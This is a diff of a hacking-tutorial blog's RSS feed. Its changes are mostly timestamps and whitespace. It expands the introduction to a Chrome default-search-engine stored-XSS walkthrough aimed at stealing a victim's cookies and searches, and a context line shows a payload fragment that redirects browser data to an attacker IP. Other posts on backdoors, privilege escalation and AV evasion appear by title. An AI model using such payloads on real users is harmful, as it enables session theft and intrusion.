@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sat, 02 Jul 2016 19:43:03 +1000</lastBuildDate>
-<pubDate>Sat, 02 Jul 2016 19:43:03 +1000</pubDate>
+<lastBuildDate>Sat, 02 Jul 2016 19:59:14 +1000</lastBuildDate>
+<pubDate>Sat, 02 Jul 2016 19:59:14 +1000</pubDate>
 <atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Google Chrome Search Poison – Default Search Engine Exploit
@@ -11,15 +11,17 @@ Google Chrome Search Poison – Default Search Engine Exploit
 
 <h2>Introduction</h2>
 
-<p>In December 2015, I discovered a vulnerability in Google Chrome's (Chromium included) default search engines feature, whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser.<br>
-In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.</p>
+<p>In December 2015, I discovered a vulnerability in Google Chrome's default search engines feature whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser. This stored XSS is then executed whenever the victim searches using the omnibox.<br>
+In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.<br>
+<br>
+Note: The vulnerability has been reported to the Chromium team but they will not fix the issue.</p>
 
 <h2>Video Demo</h2>
 
 <p><a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">https://www.youtube.com/watch?v=WoF-LkA6fMk</a><br>
 The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.</p>
 
-<h2>Setting up the Listener in Kali</h2>
+<h2>Walkthrough - Setting up the Listener in Kali</h2>
 
 <p><code></p>
 
@@ -75,7 +77,7 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 ]]></description><link>https://metalkey.net/google-chrome-search-poison---default-search-engine-exploit.html</link>
 <guid>https://metalkey.net/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
 <dc:creator>metalkey</dc:creator>
-<pubDate>Sat, 02 Jul 2016 19:41:50 +1000</pubDate></item>
+<pubDate>Sat, 02 Jul 2016 19:59:13 +1000</pubDate></item>
 <item><title>
 UnrealIRCD 3.2.8.1 Backdoor Command Execution
 </title><description><![CDATA[
@@ -133,6 +135,7 @@ root@metasploitable:/etc/unreal#
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/unrealircd-3281-backdoor-command-execution.html</link>
 <guid>https://metalkey.net/./unrealircd-3281-backdoor-command-execution.html</guid>
@@ -179,6 +182,7 @@ root@metasploitable:/#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
 
 <!-- text end -->
 ]]></description><link>https://metalkey.net/vsftpd-v234-backdoor-command-execution.html</link>
@@ -275,6 +279,7 @@ root
 <p></code></p>
 
 <p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>
+
 
 <!-- text end -->
 ]]></description><link>https://metalkey.net/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
@@ -403,6 +408,7 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 <p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/shellshock-explained--exploitation-tutorial.html</link>
 <guid>https://metalkey.net/./shellshock-explained--exploitation-tutorial.html</guid>
@@ -518,6 +524,7 @@ C:\7-ZipPortable>
 
 <p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
 
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/shellter---the-ultimate-tool-for-av-evasion.html</link>
 <guid>https://metalkey.net/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
@@ -574,6 +581,7 @@ We have successfully set txpower to 30dBM (1-Watt).<br>
 Higher values can also be set and detailed instructions are available at Null Byte (<a href="http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/">http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/</a>).</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
+
 
 <!-- text end -->
 ]]></description><link>https://metalkey.net/increasing-the-power-output-of-your-alfa-awus036h.html</link>
@@ -644,6 +652,7 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 <p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
+
 
 <!-- text end -->
 ]]></description><link>https://metalkey.net/metasploit-browser-autopwn---windows-xp-sp2.html</link>
@@ -716,6 +725,7 @@ Mode Size Type Last modified Name<br>
 <p>Uninstall flashplayer.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
+
 
 <!-- text end -->
 ]]></description><link>https://metalkey.net/metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</link>
@@ -827,6 +837,7 @@ This wordlist may prove useful when cracking hashes, capture files, etc…<br>
 You can also download wordlists and improve wordlists using the -w, -l and -a options.<br></p>
 
 <p>Tags: <a href='tag_password.html'>password</a></p>
+
 
 <!-- text end -->
 ]]></description><link>https://metalkey.net/password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</link>
